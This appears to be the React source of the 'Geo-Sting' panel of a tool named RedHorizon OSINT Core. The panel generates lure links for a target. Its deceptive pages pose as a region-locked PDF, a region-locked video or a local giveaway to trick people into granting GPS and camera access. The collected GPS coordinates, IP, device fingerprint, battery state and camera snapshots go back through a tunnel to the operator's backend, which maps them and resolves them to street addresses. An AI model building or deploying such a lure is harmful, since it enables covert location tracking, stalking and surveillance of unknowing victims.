
import React, { useState, useEffect } from 'react';
import { CopyableCoordinates } from './CopyableCoordinates';
import { Crosshair, Copy, X, Wifi, AlertTriangle, Fingerprint, MapPin, Network, BatteryCharging, MonitorSmartphone, LayoutTemplate, FileText, Video, Radio, Gift, Maximize, Minimize } from 'lucide-react';
import { MapContainer, TileLayer, Marker, Popup, useMap } from 'react-leaflet';
import 'leaflet/dist/leaflet.css';
import L from 'leaflet';

// Fix Leaflet's default icon path issues
delete (L.Icon.Default.prototype as any)._getIconUrl;
L.Icon.Default.mergeOptions({
  iconRetinaUrl: 'https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.7.1/images/marker-icon-2x.png',
  iconUrl: 'https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.7.1/images/marker-icon.png',
  shadowUrl: 'https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.7.1/images/marker-shadow.png',
});

function MapBounds({ captures }: { captures: any[] }) {
  const map = useMap();
  useEffect(() => {
    const t1 = setTimeout(() => {
        if (map) map.invalidateSize();
    }, 100);
    const t2 = setTimeout(() => {
        if (map) map.invalidateSize();
    }, 400);

    const coords = captures
      .filter(c => c.gps && c.gps.lat && c.gps.lng)
      .map(c => [parseFloat(c.gps.lat), parseFloat(c.gps.lng)] as [number, number]);
      
    if (coords.length > 0 && map) {
      if (coords.length === 1) {
        map.setView(coords[0], 16);
      } else {
        const bounds = L.latLngBounds(coords);
        map.fitBounds(bounds, { padding: [50, 50] });
      }
    }
    
    return () => {
      clearTimeout(t1);
      clearTimeout(t2);
    };
  }, [captures, map]);
  return null;
}

import { Node, Link } from '../types';

interface LocationStingProps {
  onClose: () => void;
  onLog: (msg: string, type: 'info' | 'error' | 'success' | 'warning') => void;
  updateGraph: (payload: { nodes?: (Partial<Node> & { id: string })[], links?: Link[], replace?: boolean }) => void;
}

const templates = [
    { id: 'pdf_secure', icon: <FileText size={14}/>, name: 'Secure PDF Reader', desc: 'Claims "Only users in Malaysia can view this document" to force GPS allow.' },
    { id: 'geo_video', icon: <Video size={14}/>, name: 'Region-Locked Video', desc: 'Displays "This video is not available in your region unless verified".' },
    { id: 'giveaway', icon: <Gift size={14}/>, name: 'Local Giveaway', desc: '"Verify your location to claim the prize."' }
];

const LocationSting: React.FC<LocationStingProps> = ({ onClose, onLog, updateGraph }) => {
  const [link, setLink] = useState('');
  const [activeTemplate, setActiveTemplate] = useState(() => localStorage.getItem('ls_activeTemplate') || templates[0].id);
  const [captures, setCaptures] = useState<any[]>([]);
  const [activeTargetIndex, setActiveTargetIndex] = useState(0);
  const [isMapMaximized, setIsMapMaximized] = useState(false);
  const [isMinimized, setIsMinimized] = useState(false);
  const [modules, setModules] = useState({
      gps: true,
      ip_log: true,
      canvas_fingerprint: true,
      battery_network: true,
      device_sensors: true,
      camera_snap: true,
  });

  const toggleModule = (key: keyof typeof modules) => {
      setModules(prev => ({ ...prev, [key]: !prev[key] }));
  };

  const [lureUrl, setLureUrl] = useState('');
  const [address, setAddress] = useState('');
  const [customDomain, setCustomDomain] = useState(() => localStorage.getItem('ls_customDomain') || '');
  const [currentTargetId, setCurrentTargetId] = useState<string | null>(() => localStorage.getItem('ls_currentTargetId') || null);

  useEffect(() => {
    // Restore link if we have a targetId
    if (currentTargetId && customDomain.trim()) {
        const cleanDomain = customDomain.trim().replace(/\/+$/, '');
        const domain = cleanDomain.startsWith('http') ? cleanDomain : `https://${cleanDomain}`;
        const params = new URLSearchParams({ id: currentTargetId, t: activeTemplate });
        if (modules.camera_snap) params.append('c', '1');
        setLink(`${domain}/lure?${params.toString()}`);
    }
  }, []);

  useEffect(() => {
    localStorage.setItem('ls_activeTemplate', activeTemplate);
  }, [activeTemplate]);

  useEffect(() => {
    localStorage.setItem('ls_customDomain', customDomain);
  }, [customDomain]);

  useEffect(() => {
      let pollInterval: NodeJS.Timeout;
      let lastCapturesLength = 0;
      if (currentTargetId) {
          localStorage.setItem('ls_currentTargetId', currentTargetId);
          onLog(`LISTENING FOR TARGET: ${currentTargetId}`, 'info');

          pollInterval = setInterval(async () => {
              try {
                  let cleanDomain = customDomain.trim().replace(/\/+$/, '');
                  // Bypassing mixed content error if running in HTTPS but domain is HTTP
                  if (cleanDomain.startsWith('http://') && !cleanDomain.includes('localhost') && window.location.protocol === 'https:') {
                      cleanDomain = cleanDomain.replace('http://', 'https://');
                  } else if (!cleanDomain.startsWith('http') && cleanDomain !== '') {
                      cleanDomain = `https://${cleanDomain}`;
                  }
                  
                  const fetchUrl = cleanDomain ? `${cleanDomain}/api/sting/${currentTargetId}` : `/api/sting/${currentTargetId}`;
                  
                  const response = await fetch(fetchUrl, {
                      headers: {
                          'ngrok-skip-browser-warning': 'true',
                          'bypass-tunnel-reminder': 'true'
                      }
                  });
                  if (response.ok) {
                      const parsedData = await response.json();
                      const data = Array.isArray(parsedData) ? parsedData : (parsedData ? [parsedData] : []);
                      
                      if (data.length > 0) {
                          // Standardized grouping: only merge if hash is present AND matches.
                          // This ensures multiple peranti (devices) on same network/IP with unique hashes are treated separately.
                          const groupedData = data.reduce((acc: any[], curr: any) => {
                             const existing = curr.hash ? acc.find(item => item.hash === curr.hash) : null;
                             if (existing) {
                                 // Update existing entry with newer data (prioritize data with more info)
                                 if (curr.gps) existing.gps = curr.gps;
                                 if (curr.camSnap) {
                                     existing.camSnap = curr.camSnap;
                                     existing.camSnaps = curr.camSnaps;
                                 }
                                 if (curr.address) existing.address = curr.address;
                                 if (curr.osint) existing.osint = curr.osint;
                                 if (curr.battery) existing.battery = curr.battery;
                                 if (curr.status === 'clicked_button') existing.status = 'clicked_button';
                             } else {
                                 acc.push({ ...curr });
                             }
                             return acc;
                          }, []);

                          if (groupedData.length > lastCapturesLength) {
                              onLog(`NEW INTERCEPT [${groupedData.length}]: Connection from ${groupedData[groupedData.length-1].ip}`, 'success');
                              setActiveTargetIndex(groupedData.length - 1);
                              lastCapturesLength = groupedData.length;
                          }
                          setCaptures(groupedData);
                          if (!address && groupedData[groupedData.length - 1].address) {
                            setAddress(groupedData[groupedData.length - 1].address);
                          }
                      }
                  }
              } catch (e: any) {
                  if (e.name !== 'TypeError' && e.message !== 'Failed to fetch') {
                      console.error('Polling error', e);
                  }
                  // We silently handle 'Failed to fetch' to avoid console spam when waiting for tunnel connection
              }
          }, 3000);
          
          return () => clearInterval(pollInterval);
      } else {
          localStorage.removeItem('ls_currentTargetId');
      }
  }, [currentTargetId]);

  const generateLink = () => {
    if (!customDomain.trim()) {
        alert("Sila masukkan Custom Domain (contoh: xyz.lhr.life atau xyz.ngrok-free.app) untuk membolehkan target berhubung ke backend lokal anda.");
        return;
    }
    const id = Math.random().toString(36).substring(7);
    let cleanDomain = customDomain.trim().replace(/\/+$/, '');
    if (cleanDomain.startsWith('http://') && !cleanDomain.includes('localhost') && window.location.protocol === 'https:') {
        cleanDomain = cleanDomain.replace('http://', 'https://');
    } else if (!cleanDomain.startsWith('http') && cleanDomain !== '') {
        cleanDomain = `https://${cleanDomain}`;
    }
    const backendDomain = cleanDomain;
    
    // Always use the backend domain to serve the payload directly, avoiding AI Studio login walls
    const params = new URLSearchParams({ id: id, t: activeTemplate });
    if (modules.camera_snap) {
        params.append('c', '1');
    }
    const url = `${backendDomain}/lure?${params.toString()}`;
    
    setLink(url);
    setCurrentTargetId(id);
    onLog(`LURE GENERATED (ID: ${id}) : ${url}`, 'info');
    onLog('Weaponized payload ready. Deploy to target and await connection.', 'warning');
    onLog(`Payload configured to exfiltrate to standalone Express backend: ${backendDomain}`, 'info');
  };

  const lookupAddress = async (lat: string, lng: string) => {
    try {
      const resp = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`);
      const data = await resp.json();
      if (data.display_name) {
        setAddress(data.display_name);
        onLog(`ADDRESS RESOLVED: ${data.display_name}`, 'success');
      }
    } catch (e) {
      console.error(e);
    }
  };

  const handleExportToGraph = () => {
       const activeTarget = captures[activeTargetIndex];
       if (!activeTarget) return;

       const targetId = `sting_target_${activeTarget.hash || Date.now()}`;
       const ipNodeId = `sting_ip_${activeTarget.hash || Date.now()}`;
       const intelNodeId = `sting_intel_${activeTarget.hash || Date.now()}`;
       const mediaNodeId = `sting_media_${activeTarget.hash || Date.now()}`;

       const nodes: Node[] = [
           {
               id: targetId,
               label: `TARGET: ${activeTarget.ip}`,
               type: 'location_sting',
               details: `[ROOT TARGET NODE]\nTIMESTAMP: ${activeTarget.timestamp}\nADDRESS: ${activeTarget.address || 'N/A'}\nIP: ${activeTarget.ip}`,
               url: activeTarget.gps ? `https://www.google.com/maps?q=${activeTarget.gps.lat},${activeTarget.gps.lng}` : undefined
           },
           {
               id: ipNodeId,
               label: `NETWORK: ${activeTarget.ip}`,
               type: 'target',
               details: `IP: ${activeTarget.ip}\nUA: ${activeTarget.ua}\nHASH: ${activeTarget.hash}`
           },
           {
               id: intelNodeId,
               label: `INTEL BREAKDOWN`,
               type: 'intel',
               details: `[OSINT REPORT]\nPLATFORM: ${activeTarget.osint?.platform}\nCPU: ${activeTarget.osint?.cpu}\nRAM: ${activeTarget.osint?.ram}GB\nRES: ${activeTarget.osint?.res}\nTZ: ${activeTarget.osint?.timezone}\nBATTERY: ${activeTarget.battery?.level}%`
           }
       ];

       const links: Link[] = [
           { source: targetId, target: ipNodeId, label: 'resolved_ip' },
           { source: targetId, target: intelNodeId, label: 'fingerprint' }
       ];

       if (activeTarget.camSnaps && activeTarget.camSnaps.length > 0) {
           nodes.push({
               id: mediaNodeId,
               label: `MEDIA: ${activeTarget.camSnaps.length} SNAPS`,
               type: 'media',
               details: `Visual confirmation data acquired from target camera.`,
               imageUrl: activeTarget.camSnaps[0],
               imageUrls: activeTarget.camSnaps
           });
           links.push({ source: targetId, target: mediaNodeId, label: 'captured_media' });
       }

       updateGraph({ nodes, links });
       onLog(`Hierarchical data for Target [${activeTarget.hash}] exported to graph.`, 'success');
       onClose();
  };
  
  const currentCapture = captures[activeTargetIndex];

  if (isMinimized) {
      return (
          <div className="fixed bottom-4 right-4 z-[100] animate-in fade-in slide-in-from-bottom-5">
              <button 
                  onClick={() => setIsMinimized(false)}
                  className="bg-black border border-cyan-500 text-cyan-400 px-4 py-3 font-black text-xs uppercase tracking-[0.2em] flex items-center gap-4 shadow-[0_0_20px_rgba(6,182,212,0.5)] hover:bg-cyan-950 transition-all group"
              >
                  <div className="relative">
                      <Crosshair size={18} className="text-cyan-500 animate-pulse" />
                      {captures.length > 0 && (
                          <div className="absolute -top-3 -right-3 bg-red-600 text-white text-[9px] px-1.5 py-0.5 rounded-full border-2 border-black font-bold">
                              {captures.length}
                          </div>
                      )}
                  </div>
                  <div className="flex flex-col items-start leading-none gap-1">
                      <span className="text-[10px] text-white">GEO_STING_MONITOR</span>
                      <span className="text-[8px] text-cyan-700 tracking-widest uppercase">Target_Lock: ACTIVE</span>
                  </div>
                  <Maximize size={16} className="group-hover:scale-125 transition-transform ml-2" />
              </button>
          </div>
      );
  }

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/95 p-1 md:p-2">
        <div className="w-full max-w-[1500px] bg-[#0a0a0a] border border-cyan-500 shadow-[0_0_50px_rgba(6,182,212,0.3)] p-2 md:p-3 font-mono flex flex-col h-full max-h-[99vh] overflow-y-auto custom-scrollbar">
            <div className="flex justify-between items-center mb-1.5 border-b border-gray-800 pb-1.5">
                <div className="flex items-center gap-1.5">
                    <div className="p-0.5 px-1 bg-cyan-900/30 rounded border border-cyan-500/50">
                         <Crosshair className="text-cyan-500 animate-pulse" size={14} />
                    </div>
                    <div>
                         <h3 className="text-[10px] md:text-xs font-black text-white uppercase tracking-tighter shrink-0">OSINT :: Geo-Sting Payload</h3>
                         <div className="text-[6px] md:text-[8px] text-cyan-700 tracking-[0.2em] font-bold uppercase">v4.3.0 // Unified Tactical Ops</div>
                    </div>
                </div>
                <div className="flex items-center gap-3">
                    <div className="hidden sm:flex items-center gap-1.5 font-black text-[8px] text-gray-500">
                        <span className="text-cyan-950 uppercase">Sec_Link_Active</span>
                        <div className="w-1 h-1 bg-green-500 rounded-full animate-pulse" />
                    </div>
                    <div className="flex items-center gap-1">
                        <button onClick={() => setIsMinimized(true)} className="p-1 hover:bg-white/10 transition-colors shrink-0" title="Minimize"><Minimize size={14} className="text-gray-600 hover:text-white" /></button>
                        <button onClick={onClose} className="p-1 hover:bg-white/10 transition-colors shrink-0"><X className="text-gray-600 hover:text-white" size={16} /></button>
                    </div>
                </div>
           </div>
           
            <div className="flex-1 overflow-hidden flex flex-col lg:flex-row gap-1">
                {/* Left Controls - Scrollable */}
                <div className="w-full lg:w-60 flex flex-col overflow-y-auto pr-1 custom-scrollbar gap-1 border-r border-gray-800/10 lg:pr-1">
                    <div className="bg-black/40 p-1 border border-white/5 pb-0">
                         <div className="flex items-center gap-1 mb-1 text-cyan-400 border-b border-gray-800/50 pb-0.5">
                             <LayoutTemplate size={11}/>
                             <span className="font-bold text-[8px] uppercase tracking-widest">1. Lure</span>
                         </div>
                         <div className="grid grid-cols-1 gap-0.5">
                             {templates.map(tpl => (
                                 <button 
                                     key={tpl.id}
                                     onClick={() => setActiveTemplate(tpl.id)}
                                     className={`w-full flex flex-col text-left p-1 border transition-all duration-300 ${activeTemplate === tpl.id ? 'border-cyan-500 bg-cyan-900/10' : 'border-gray-800 bg-black hover:border-gray-700'}`}
                                 >
                                     <div className="flex items-center gap-1 text-white font-bold text-[9px] mb-0.5">
                                         {tpl.icon} {tpl.name}
                                     </div>
                                     <div className="text-[7px] text-gray-500 leading-tight uppercase tracking-tighter truncate w-full">{tpl.desc}</div>
                                 </button>
                             ))}
                         </div>
                    </div>
 
                     <div className="bg-black/40 p-1 border border-white/5">
                         <div className="flex items-center gap-1 mb-1 text-cyan-400 border-b border-gray-800 pb-0.5">
                             <Network size={12}/>
                             <span className="font-bold text-[9px] uppercase tracking-widest">2. Tunnel</span>
                         </div>
                         <div className="space-y-1">
                             <input 
                                 type="text" 
                                 placeholder="e.g. domain.lhr.life" 
                                 value={customDomain}
                                 onChange={(e) => setCustomDomain(e.target.value)}
                                 className="w-full bg-black border border-gray-800 text-cyan-400 text-[9px] p-1.5 focus:border-cyan-500 outline-none placeholder:text-gray-800 font-mono transition-colors"
                             />
                             <button 
                                 onClick={generateLink} 
                                 className="w-full py-1.5 bg-cyan-600 font-black text-black text-[9px] uppercase tracking-widest hover:bg-white active:scale-[0.98] transition-all"
                             >
                                 {link ? 'RE-WEAPONIZE' : 'GENERATE PAYLOAD'}
                             </button>
                         </div>
                     </div>
 
                     <div className="bg-black/30 p-1 border border-white/5">
                         <div className="flex items-center gap-1 mb-1 text-cyan-400 border-b border-gray-800 pb-0.5">
                             <Fingerprint size={12}/>
                             <span className="font-bold text-[9px] uppercase tracking-widest">3. Logic</span>
                         </div>
                         <div className="grid grid-cols-2 gap-1">
                             {(Object.keys(modules) as Array<keyof typeof modules>).map(key => (
                                 <button 
                                     key={key}
                                     onClick={() => toggleModule(key)}
                                     className={`flex items-center justify-between p-1 border text-[7px] font-bold uppercase tracking-wider transition-colors ${modules[key] ? 'border-cyan-500/50 bg-cyan-950/20 text-cyan-400' : 'border-gray-800 text-gray-700'}`}
                                 >
                                     <span className="truncate">{key.replace('_', ' ')}</span>
                                     <div className={`w-1 h-1 rounded-full shrink-0 ${modules[key] ? 'bg-cyan-400 shadow-[0_0_5px_rgba(34,211,238,0.5)]' : 'bg-gray-800'}`} />
                                 </button>
                             ))}
                         </div>
                     </div>
                </div>
                
                {/* Center - Main Display (Map & Console) */}
                <div className="flex-1 flex flex-col min-w-0 gap-1">
                     {/* Top Stats Bar */}
                     <div className="flex gap-1">
                         <div className="flex-1 bg-black/20 border border-gray-800/50 p-1 flex items-center justify-between">
                             <div className="flex items-center gap-3">
                                 <div className="flex flex-col leading-tight">
                                     <span className="text-[6px] text-gray-600 font-bold uppercase">Targets</span>
                                     <span className={`text-sm font-black ${captures.length > 0 ? 'text-green-500' : 'text-gray-800'}`}>
                                         {captures.length.toString().padStart(2, '0')}
                                     </span>
                                 </div>
                                 <div className="h-4 w-px bg-gray-800" />
                                 <div className="flex flex-col leading-tight">
                                     <span className="text-[6px] text-gray-600 font-bold uppercase">Log.Status</span>
                                     <span className="text-sm font-black text-gray-800 tracking-tighter uppercase">
                                         {captures.length > 0 ? 'Synced' : 'Ready'}
                                     </span>
                                 </div>
                             </div>
                             <div className="hidden sm:flex items-center gap-2">
                                 <span className="text-[6px] text-gray-800 font-mono uppercase">Node_ID: {currentTargetId || 'None'}</span>
                                 <div className={`w-1 h-1 rounded-full ${captures.length > 0 ? 'bg-green-500 animate-pulse' : 'bg-gray-900'}`} />
                             </div>
                         </div>
                     </div>

                    {/* Main Map Display */}
                    <div className={`transition-all duration-300 ${isMapMaximized ? 'fixed inset-2 z-[100] border-cyan-500 shadow-[0_0_50px_rgba(6,182,212,0.4)] bg-[#050505]' : 'flex-1 min-h-[250px] relative group mb-0 border border-cyan-500/30 overflow-hidden bg-black/60 shadow-inner'}`}>
                        <div className="absolute top-2 left-2 z-30 space-y-1">
                            <div className="bg-black/80 border border-gray-700 px-2 py-1 text-[8px] text-cyan-400 font-bold backdrop-blur-sm flex items-center gap-1.5">
                                <MapPin size={10} /> TELEMETRY OVERLAY
                            </div>
                            {captures.length > 1 && (
                                <div className="flex gap-0.5 overflow-x-auto max-w-[200px] hide-scrollbar pointer-events-auto">
                                    {captures.map((_, i) => (
                                        <button 
                                            key={i} 
                                            onClick={() => setActiveTargetIndex(i)}
                                            className={`px-2 py-0.5 border text-[8px] font-bold transition-all ${activeTargetIndex === i ? 'bg-cyan-600 text-black border-cyan-400' : 'bg-black/60 text-gray-500 border-gray-800 hover:border-gray-600'}`}
                                        >
                                            #{i+1}
                                        </button>
                                    ))}
                                </div>
                            )}
                        </div>

                        <div className="absolute top-2 right-2 z-30">
                            <button 
                                onClick={() => setIsMapMaximized(!isMapMaximized)}
                                className="bg-black/80 border border-cyan-700 p-1.5 text-cyan-400 hover:text-white hover:border-cyan-400 transition-colors backdrop-blur-sm"
                            >
                                {isMapMaximized ? <Minimize size={14} /> : <Maximize size={14} />}
                            </button>
                        </div>

                        {captures.some(c => c.gps) ? (
                            <div className="h-full w-full relative group filter invert contrast-125 opacity-80 z-0">
                                <style>{`
                                    .leaflet-container { background: #fff !important; z-index: 1; }
                                    .leaflet-container img { max-width: none !important; margin: 0; padding: 0; }
                                    .leaflet-control-attribution { display: none; }
                                    .leaflet-pane { z-index: 1 !important; }
                                `}</style>
                                <MapContainer 
                                    center={[0, 0]} 
                                    zoom={2} 
                                    style={{ height: '100%', width: '100%', minHeight: '300px' }}
                                    zoomControl={false}
                                >
                                    <TileLayer url="https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png" />
                                    <MapBounds captures={captures} />
                                    {captures.map((c, i) => c.gps && (
                                        <Marker 
                                            key={c.hash || i} 
                                            position={[parseFloat(c.gps.lat), parseFloat(c.gps.lng)]}
                                            eventHandlers={{
                                                click: () => setActiveTargetIndex(i),
                                            }}
                                        >
                                            <Popup className="font-mono text-xs">
                                                <div className="space-y-2 min-w-[150px]">
                                                    <div className="font-bold border-b border-gray-200 pb-1 flex justify-between items-center">
                                                        <span>TARGET #{i+1}</span>
                                                        <span className="text-[10px] text-gray-400 font-normal">
                                                            {c.timestamp ? c.timestamp.split('T')[1].split('.')[0] : ''}
                                                        </span>
                                                    </div>
                                                    <div><span className="text-gray-400">IP:</span> {c.ip}</div>
                                                    {c.camSnaps && c.camSnaps.length > 0 && (
                                                        <div className="mt-2 border border-black/5 bg-gray-50 p-1">
                                                            <div className="grid grid-cols-2 gap-1">
                                                                {c.camSnaps.slice(0, 4).map((img: string, idx: number) => (
                                                                    <img key={idx} src={img} alt={`Snapshot ${idx}`} className="w-full h-auto rounded-sm" />
                                                                ))}
                                                            </div>
                                                            <div className="text-[8px] text-center text-gray-400 mt-1 uppercase">{c.camSnaps.length} Snapshots Acquired</div>
                                                        </div>
                                                    )}
                                                </div>
                                            </Popup>
                                        </Marker>
                                    ))}
                                </MapContainer>
                            </div>
                        ) : (
                            <div className="h-full w-full flex flex-col items-center justify-center bg-[#050505] z-0 relative">
                                <div className="relative">
                                    <Crosshair size={80} className="text-gray-900 absolute -top-10 -left-10 animate-spin-slow opacity-20" />
                                    <Wifi size={48} className="text-gray-800 animate-pulse mb-4" />
                                </div>
                                <div className="text-xs text-gray-600 font-bold uppercase tracking-[0.4em] mb-2">
                                    {captures.length > 0 ? 'TELEMETRY SECURED (GPS DENIED)' : 'Awaiting Telemetry Feed'}
                                </div>
                                <div className="text-[9px] text-gray-800 max-w-xs text-center leading-relaxed">
                                    {captures.length > 0 
                                      ? "Target connection resolved. Location telemetry blocked by device. IP routing available."
                                      : "Link generated. Polling backend for incoming connections. Device fingerprinting is automatic upon click event."}
                                </div>
                            </div>
                        )}

                        {/* Always show overlay info if we have a current capture */}
                        {currentCapture && (
                            <div className="absolute bottom-2 left-2 right-2 md:right-auto md:left-auto md:bottom-2 md:right-2 z-30 flex flex-col md:flex-row gap-2 pointer-events-none">
                                {currentCapture.camSnaps && currentCapture.camSnaps.length > 0 && (
                                    <div className="bg-black/95 border border-cyan-800/80 p-1.5 backdrop-blur-md max-w-[160px] shadow-[0_0_20px_rgba(6,182,212,0.3)] pointer-events-auto">
                                        <div className="text-[7px] text-cyan-400 mb-1 font-bold uppercase flex items-center justify-between gap-1">
                                            <div className="flex items-center gap-1"><Video size={8} className="animate-pulse" /> FEED_LOCKED</div>
                                            <div className="text-[7px] text-gray-500">[{currentCapture.camSnaps.length}]</div>
                                        </div>
                                        <div className="grid grid-cols-1 gap-0.5">
                                            <img src={currentCapture.camSnap} alt="Current frame" className="w-full h-auto filter sepia-[0.2] contrast-125 border border-cyan-900/50" />
                                        </div>
                                    </div>
                                )}
                                <div className="bg-black/90 border border-cyan-600/50 p-2.5 backdrop-blur-md flex-1 md:w-64">
                                    <div className="text-[7px] text-cyan-400 mb-1 font-bold uppercase flex items-center justify-between">
                                        <div className="flex items-center gap-1.5">
                                            <Crosshair size={10} /> Target Locked
                                        </div>
                                        <span className="text-gray-500">{currentCapture.timestamp ? currentCapture.timestamp.split('T')[1].split('.')[0] : new Date().toLocaleTimeString()}</span>
                                    </div>
                                    <div className="text-[10px] text-white font-bold mb-1 leading-tight truncate">
                                        {currentCapture.gps ? (address || "Resolving address...") : "GPS BLOCKED"}
                                    </div>
                                    <div className="text-[8px] text-gray-500 flex flex-wrap items-center gap-2 font-mono">
                                        {currentCapture.gps ? (
                                          <CopyableCoordinates lat={parseFloat(currentCapture.gps.lat)} lon={parseFloat(currentCapture.gps.lng)} label="GPS" />
                                        ) : (
                                          <span className="text-red-500 font-bold">GPS: DENIED</span>
                                        )}
                                        <span>IP: <span className="text-cyan-500 font-bold">{currentCapture.ip.substring(0,8)}...</span></span>
                                    </div>
                                </div>
                            </div>
                        )}
                        
                        {/* Overlay Scanlines Effect */}
                        <div className="absolute inset-0 pointer-events-none opacity-5 bg-[linear-gradient(rgba(18,16,16,0)_50%,rgba(0,0,0,0.25)_50%),linear-gradient(90deg,rgba(255,0,0,0.06),rgba(0,255,0,0.02),rgba(0,0,255,0.06))] z-20 bg-[length:100%_2px,3px_100%]" />
                    </div>

                    {/* Bottom Console */}
                    <div className="h-32 bg-black border border-gray-800 p-2 font-mono text-[9px] md:text-[10px] text-cyan-600 overflow-y-auto custom-scrollbar relative">
                        <div className="absolute top-1.5 right-3 text-[7px] text-gray-700 font-bold tracking-widest">LOG_V4_CORE</div>
                        <div className="text-gray-800 mb-1">// OSINT Kernel v4.3.0 initialized...</div>
                        {captures.map((c, i) => (
                            <div key={i} className={`mt-0.5 border-b border-white/5 pb-0.5 ${activeTargetIndex === i ? 'bg-cyan-900/10' : ''} break-all whitespace-pre-wrap`}>
                                <span className="text-green-600 font-bold">&gt; [{c.timestamp ? c.timestamp.split('T')[1].split('.')[0] : new Date().toLocaleTimeString()}]</span> 
                                <span className="text-cyan-500"> ID#{i+1}</span> :: {c.ip} :: {c.gps ? 'GPS_OK' : 'GPS_FAIL'}
                                {c.camSnap && <span className="text-cyan-400 ml-1 font-bold"> [CAM]</span>}
                            </div>
                        ))}
                        {captures.length === 0 && <div className="text-gray-800 mt-1 italic text-[8px]">// Awaiting trigger event...</div>}
                    </div>
               </div>
               
               {/* Right Side - Actions & Data */}
               {link && (
                    <div className="w-full lg:w-64 flex flex-col gap-2 overflow-hidden h-full">
                        <div className="bg-cyan-900/10 border border-cyan-800/20 p-2 shrink-0">
                            <div className="text-[8px] text-cyan-400 uppercase font-black mb-2 flex items-center gap-1.5">
                                <Radio size={10} className="animate-pulse" /> Payload Link
                            </div>
                            <div className="flex gap-1 mb-1.5">
                                <input value={link} readOnly className="flex-1 bg-black border border-gray-800 text-white text-[8px] p-1.5 focus:outline-none" />
                                <button onClick={() => {navigator.clipboard.writeText(link); onLog('URL copied.', 'success');}} className="bg-cyan-600 text-black px-2 py-1 font-bold hover:bg-white transition-colors">
                                    <Copy size={12} />
                                </button>
                            </div>
                        </div>

                        {currentCapture && (
                            <div className="flex-1 bg-black/40 border border-gray-800 p-2 flex flex-col overflow-hidden">
                                <div className="text-[8px] text-cyan-400 uppercase font-black mb-2 border-b border-gray-900 pb-1 flex items-center gap-1.5">
                                    <MonitorSmartphone size={10} /> Intel Breakdown
                                </div>
                                <div className="flex-1 overflow-y-auto space-y-3 pr-0.5 custom-scrollbar text-[10px] font-mono leading-tight">
                                    <div className="space-y-0.5">
                                        <div className="text-gray-600 uppercase font-bold text-[7px]">Network / Identity</div>
                                        <div className="flex justify-between border-b border-gray-900 py-0.5">
                                            <span className="text-gray-700">IP</span>
                                            <span className="text-white font-bold">{currentCapture.ip}</span>
                                        </div>
                                    </div>

                                    {currentCapture.osint && (
                                        <div className="space-y-0.5">
                                            <div className="text-gray-600 uppercase font-bold text-[7px]">Hardware</div>
                                            <div className="flex justify-between border-b border-gray-900 py-0.5">
                                                <span className="text-gray-700">Platform</span>
                                                <span className="text-white font-bold">{currentCapture.osint.platform}</span>
                                            </div>
                                            <div className="flex justify-between border-b border-gray-900 py-0.5">
                                                <span className="text-gray-700">Resolution</span>
                                                <span className="text-white font-bold">{currentCapture.osint.res}</span>
                                            </div>
                                        </div>
                                    )}

                                    {currentCapture.camSnaps && currentCapture.camSnaps.length > 0 && (
                                        <div className="space-y-1 mt-1">
                                            <div className="text-cyan-500 uppercase font-bold text-[7px] flex items-center justify-between">
                                                <span>Camera Array</span>
                                                <span className="text-cyan-900">{currentCapture.camSnaps.length}X</span>
                                            </div>
                                            <div className="grid grid-cols-1 gap-1 p-0.5 bg-black border border-gray-900">
                                                {currentCapture.camSnaps.map((img: string, idx: number) => (
                                                    <div key={idx} className="relative">
                                                        <img src={img} alt={`Ex ${idx}`} className="w-full h-auto filter sepia-[0.3] contrast-125 border border-cyan-900/10" />
                                                        <div className="absolute top-0.5 left-0.5 bg-black/80 text-[6px] px-1 text-cyan-600">S_{idx+1}</div>
                                                    </div>
                                                ))}
                                            </div>
                                        </div>
                                    )}
                                </div>
                                
                                <div className="mt-4 space-y-1 pt-2 border-t border-gray-800">
                                    <button onClick={handleExportToGraph} className="w-full py-1.5 bg-green-800 hover:bg-green-700 text-black font-black text-[9px] uppercase tracking-widest transition-all">
                                        Export Node
                                    </button>
                                </div>
                            </div>
                        )}
                    </div>
               )}
           </div>
           
           <div className="text-[10px] text-gray-700 mt-4 border-t border-gray-900 pt-4 flex items-center justify-between font-mono bg-[#0a0a0a] z-10">
               <div className="flex items-center gap-3">
                    <div className="flex items-center gap-1">
                        <AlertTriangle size={12} className="text-yellow-800" />
                        <span className="font-bold">STATUS: AUTHORIZED_USE_ONLY</span>
                    </div>
                    <div className="h-4 w-px bg-gray-900" />
                    <span>ENCRYPTION: AES-256</span>
               </div>
               <div className="flex items-center gap-2">
                    <div className="w-1.5 h-1.5 bg-cyan-900 rounded-full" />
                    <span className="tracking-tighter uppercase font-bold text-gray-800">RedHorizon OSINT Core</span>
               </div>
           </div>
       </div>
    </div>
  );
};

export default LocationSting;
